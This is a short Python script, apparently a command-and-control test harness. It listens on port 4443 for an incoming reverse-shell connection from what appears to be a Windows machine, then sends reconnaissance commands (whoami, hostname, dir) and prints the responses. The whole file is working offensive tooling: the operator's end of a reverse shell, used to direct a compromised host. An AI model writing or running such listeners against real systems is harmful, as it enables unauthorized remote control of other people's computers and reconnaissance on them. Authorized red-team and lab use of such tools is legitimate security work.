"""Quick non-interactive C2 test — catches callback, runs commands, exits."""
import socket, time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.settimeout(30)

try:
    s.bind(("0.0.0.0", 4443))
    s.listen(1)
    print("[*] Listening on 0.0.0.0:4443... waiting 30s for callback")

    conn, addr = s.accept()
    print(f"[+] CONNECTION from {addr[0]}:{addr[1]}")
    conn.settimeout(3)

    # grab banner
    time.sleep(1.5)
    try:
        banner = conn.recv(8192)
        print("[+] Banner received")
    except socket.timeout:
        print("[*] No banner")

    # run commands
    cmds = ["whoami", "hostname", "C:", "cd \\", "dir"]
    for cmd in cmds:
        print(f"\n[>] {cmd}")
        conn.sendall((cmd + "\n").encode())
        time.sleep(1.5)
        try:
            resp = conn.recv(8192)
            text = resp.decode("utf-8", errors="replace").strip()
            print(text)
        except socket.timeout:
            print("[*] (no response)")

    conn.close()
    print("\n[+] Test complete.")

except socket.timeout:
    print("[-] No callback within 30s.")
except OSError as e:
    print(f"[-] Error: {e}")
finally:
    s.close()
